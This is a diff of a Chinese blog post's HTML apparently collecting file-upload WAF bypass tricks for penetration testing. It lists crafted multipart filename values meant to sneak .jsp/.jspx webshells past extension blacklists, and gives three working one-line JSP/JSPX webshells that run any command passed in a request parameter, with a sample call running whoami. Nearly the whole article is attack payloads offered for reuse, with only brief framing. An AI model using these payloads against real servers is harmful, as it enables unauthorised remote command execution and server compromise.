@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前言现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。 正文后缀绕过白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。 jsp 1.jpg\.jsp&#x2F;以下内容可以尝试换行试一下 filename&#x3D;’shell.jspx.jsp’ filename&#x3D;shell.jsp">
+    <meta name="description" content="前言 现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。 正文 后缀绕过 白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。 jsp  1.jpg\.jsp&#x2F; 以下内容可以尝试换行试一下 filename&#x3D;&#39;shell.jspx.jsp&#39; filename&#x3D;shell.jspx.jsp file">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传绕过waf姿势收集">
 <meta property="og:url" content="https://blog.njcit.me/2023/03/23/waf_bypass/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="这里有一个网站">
-<meta property="og:description" content="前言现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。 正文后缀绕过白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。 jsp 1.jpg\.jsp&#x2F;以下内容可以尝试换行试一下 filename&#x3D;’shell.jspx.jsp’ filename&#x3D;shell.jsp">
+<meta property="og:description" content="前言 现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。 正文 后缀绕过 白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。 jsp  1.jpg\.jsp&#x2F; 以下内容可以尝试换行试一下 filename&#x3D;&#39;shell.jspx.jsp&#39; filename&#x3D;shell.jspx.jsp file">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-03-23T01:27:44.000Z">
 <meta property="article:modified_time" content="2023-03-23T02:48:49.365Z">
@@ -152,38 +152,39 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。</p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h2><p>白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。</p>
-<h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><ul>
-<li>1.jpg\.jsp&#x2F;<br>以下内容可以尝试换行试一下</li>
-<li>filename&#x3D;’shell.jspx.jsp’</li>
-<li>filename&#x3D;shell.jspx.jsp</li>
-<li>filename&#x3D;shell.jspx.jsp’</li>
-<li>“filename”&#x3D;shell.jspx;</li>
-<li>filename&#x3D;shell.jpg;filename&#x3D;shell.jspx;</li>
-<li>filename&#x3D;shell.jspx;filename&#x3D;shell.jpg;</li>
-<li>FileName&#x3D;shell.jspx.jsp’</li>
-<li>FileName&#x3D;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp’</li>
-<li>FileName &#x3D;shell.jspx（加空格）</li>
-<li>filename&#x3D;&#x3D;&#x3D;&#x3D;”shell.jspx.jsp1”（加等号）</li>
-<li>FileName &#x3D;shell.jspx</li>
-<li>FileName&#x3D;shell.jspx.<br>jsp</li>
-<li>File<br>Name&#x3D;shell.jspx.jsp’</li>
+    <h1 id="前言">前言</h1>
+<p>现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。</p>
+<h1 id="正文">正文</h1>
+<h2 id="后缀绕过">后缀绕过</h2>
+<p>白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。</p>
+<h3 id="jsp">jsp</h3>
+<ul>
+<li>1.jpg\.jsp/ 以下内容可以尝试换行试一下</li>
+<li>filename='shell.jspx.jsp'</li>
+<li>filename=shell.jspx.jsp</li>
+<li>filename=shell.jspx.jsp'</li>
+<li>"filename"=shell.jspx;</li>
+<li>filename=shell.jpg;filename=shell.jspx;</li>
+<li>filename=shell.jspx;filename=shell.jpg;</li>
+<li>FileName=shell.jspx.jsp'</li>
+<li>FileName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp'</li>
+<li>FileName =shell.jspx（加空格）</li>
+<li>filename===="shell.jspx.jsp1"（加等号）</li>
+<li>FileName =shell.jspx</li>
+<li>FileName=shell.jspx. jsp</li>
+<li>File Name=shell.jspx.jsp'</li>
 </ul>
-<h2 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h2><p>jsp利用EL表达式绕过</p>
+<h2 id="内容绕过">内容绕过</h2>
+<p>jsp利用EL表达式绕过</p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;x&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
-
-<p>jspx利用命名空间绕过:<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/test.jsp?ccadmin=whoami,%E5%85%B6%E4%B8%ADbbb%E5%8F%AF%E4%BB%A5%E4%BB%BB%E6%84%8F%E6%9B%BF%E6%8D%A2">http://127.0.0.1:8080/test.jsp?ccadmin=whoami,其中bbb可以任意替换</a></p>
+<p>jspx利用命名空间绕过:http://127.0.0.1:8080/test.jsp?ccadmin=whoami,其中bbb可以任意替换</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bbb:root xmlns:bbb=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;</span><br><span class="line">    &lt;bbb:scriptlet&gt;</span><br><span class="line">    Runtime.getRuntime().exec(request.getParameter(&quot;ccadmin&quot;));    </span><br><span class="line">&lt;/bbb:scriptlet&gt;&gt;</span><br><span class="line">&lt;/bbb:root&gt;</span><br></pre></td></tr></table></figure>
-
 <p>jspx利用jsp:expression绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bbb:root xmlns:bbb=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;</span><br><span class="line">    &lt;bbb:expression&gt;</span><br><span class="line">    Runtime.getRuntime().exec(request.getParameter(&quot;ccadmin&quot;))</span><br><span class="line">&lt;/bbb:expression&gt;</span><br><span class="line">&lt;/bbb:root&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></li>
-<li><a target="_blank" rel="noopener" href="https://yzddmr6.com/posts/jsp-webshell-upload-bypass/">https://yzddmr6.com/posts/jsp-webshell-upload-bypass/</a></li>
+<h1 id="参考内容">参考内容</h1>
+<ul>
+<li>https://xz.aliyun.com/t/10515</li>
+<li>https://yzddmr6.com/posts/jsp-webshell-upload-bypass/</li>
 </ul>
 
   </div>
